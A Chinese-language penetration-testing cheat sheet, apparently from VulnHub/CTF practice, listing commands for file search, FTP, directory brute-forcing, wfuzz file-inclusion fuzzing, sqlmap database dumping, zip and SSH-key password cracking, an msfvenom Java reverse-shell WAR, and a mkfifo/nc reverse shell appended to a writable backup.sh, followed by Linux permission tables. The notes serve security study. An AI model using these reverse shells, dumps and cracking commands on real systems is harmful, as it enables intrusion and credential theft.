...
3. `find /usr/ -name *webbrowser*`
    在`/usr/`文件起始，寻找文件名包含`webbrowser`的文件，`*`是通配符，代表任何字符

4. `find / -name "*flag*"`

5. `find / -group administrators 2>/dev/null`
    查找系统中所有属于`administrators`用户组的文件或目录

### 2.2.2 look {#look}
1. 查找系统自带字典
`look open`会列出所有以`open`开头的英文单词
...
若有匿名帐号，输入`anonymous`或者`ftp`，密码直接回车

若需要下载`.zip`、图片、可执行文件等*非文本文件*，需要输入`binary`，然后再`get 目标文件.后缀`

退出`exit`或`quit`

非交互式获取文件：`wget ftp://ip地址/文件名.后缀`
## 2.4 strings
面对一个编译后的二进制可执行文件
`strings 此文件`
...
`dirsearch -u http://目标 -e php,bak,zip -x 404 403` 
...
### 3.4.8 wfuzz(模糊测试) {#wfuzz}
当知道服务器有一个敏感文件路径`/etc/dripispowerful.html`，但不知道首页`index.php`是通过哪个参数（例如`?page=`
、`?file=`、`?include=`）去读取它的
...
```
其中，`-c`让输出结果根据状态码带上颜色；`--hw 21`是hide words，隐藏返回的页面字数是 21 的。

当`drip`参数成功出发文件读取，原本只有21个单词的网页，现在被追加了`/etc/dripispowerful.html`里面的全部文本内容，
...
### 3.6.2 SQLmap {#sqlmap-basic}
1. 检测注入点
`sqlmap -u "http://192.168.203.139" --forms --batch`

2. 获取数据库名
`sqlmap -u "http://192.168.203.139" --forms --dbs --batch`

3. 获取指定数据库中的表名
`sqlmap -u "http://192.168.203.139" --forms -D 数据库名 --tables --batch`

4. 获取指定表中的列名
`sqlmap -u "http://192.168.203.139" --forms -D 数据库名 -T 表名 --columns --batch`

5. 拖取数据
`sqlmap -u "http://192.168.203.139" --forms -D 数据库名 -T 表名 -C "username,password" --dump --batch`

### 3.6.3 fcrackzip
1. 全是数字的短密码，暴力破解
`fcrackzip -b -c n -l 1-6 -u target.zip`
`-b`启动暴力破解模式（brute-force）
`-c n`指定字符集。（n是纯数字，a是纯小写字母，1是特殊字符）
`-l 1-6`指定密码范围1到6位
`-u`解压并验证密码（unzip）

2. 字典攻击
```
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u target.zip
```
`-D`使用字典攻击
`-p`指定密码字典路径
## 3.7 netcat
...
## 3.8 SSH私钥密码破解 {#john}
`python3 /usr/share/john/ssh2john.py /home/kali/Desktop/vulnhub/upfine > passwd.txt`
`ssh2john.py`是John自带的转换脚本，把SSH私钥文件转换成John能识别的哈希格式
`> passwd`将转换后的哈希内容写进`passwd`，（输出重定向）

`john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt`
用`rockyou.txt`字典破解`passwd.txt`里的哈希，获得SSH私钥的密码

`john --show passwd.txt`可以查看上次缓存的密码
...
```ZSH
msfvenom -p java/shell_reverse_tcp LHOST=<你的IP> LPORT=<你的端口> -f war > revshell.war
```
  - `-p java/shell_reverse_tcp`指定目标运行环境是java，获取目标系统终端，且反向TCP连接（让目标服务器主动连接攻击机）
  - `-f war`指定输出格式为WAR，这是java web应用的标准打包格式
  - 原理：大多java web服务器接收到新的WAR包，会自动将其解压并作为一个新的web路径发布，例如访问`http://target.com/shell/`会触发包内的代码
  - `msfvenom`生成的WAR包里包含一个特殊的JSP文件，当访问这个页面时，服务器端的JVM会解析并执行其中的java代码
  - JSP中的代码会调用操作系统的runtime环境，开启一个socket，主动连接攻击机


### 4.1.6 利用有权限的文件反弹shell
```ZSH
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.203.129 6666 >/tmp/f" >> backup.sh
```
  - 前提准备：`rm /tmp/f`移除可能有的`/tmp/f`，再`mkfifo /tmp/f`创建名为`/tmp/f`的命名管道(First-in-first-out)
  - 第一步（输出流）：`cat /tmp/f|/bin/sh -i 2>&1`shell等待从管道`/tmp/f`中读取指令，其中`2>&1`表示，把错误输出合并到标准输出里，攻击者能看到输入错误命令后的反馈
...
## 5.2 权限表示法（10位字符与三位数字）
Linux 的文件权限通常由 10 位字符表示（例如`-rwxrwxrwx`），这 10 位字符可以拆解为 1 个类型 + 3 组身份。

### 5.2.1 10位字符结构拆解
- 第 1 位：文件类型（`-`代表普通文件，`d`代表目录，`l`代表软链接）
- 第 2-4 位：拥有者（Owner）的权限
- 第 5-7 位：组用户（Group）的权限
- 第 8-10 位：其他人（Others）的权限

### 5.2.2 字母与数字权限对照
每一组身份的权限都由三个位置组成，分别对应：读、写、执行。如果没有权限则用`-`代替。
...
> 计算公式：三位数字就是将每组身份的字母分值相加。
> 例如：rwx = 4 + 2 + 1 = 7 ； r-x = 4 + 0 + 1 = 5

### 5.2.3 常见权限组合速查表
| 三位数字 | 10位字符权限 | 权限拆解 (拥有者/组/其他人) | 含义与常见应用场景 |
| :---: | :---: | :---: | :--- |
| 777 | -rwxrwxrwx | rwx \| rwx \| rwx | 所有人可读写执行（权限全开，极其危险） |
| 755 | -rwxr-xr-x | rwx \| r-x \| r-x | 拥有者全权限，别人可读可执行（系统命令、脚本） |
| 644 | -rw-r--r-- | rw- \| r-- \| r-- | 拥有者可读写，别人只读（普通文本、网页文件） |
| 600 | -rw------- | rw- \| --- \| --- | 拥有者可读写，别人无权限（敏感文件，如 SSH 私钥） |
...
### 6.2.2 提权思路Privilege Escalation {#privesc}
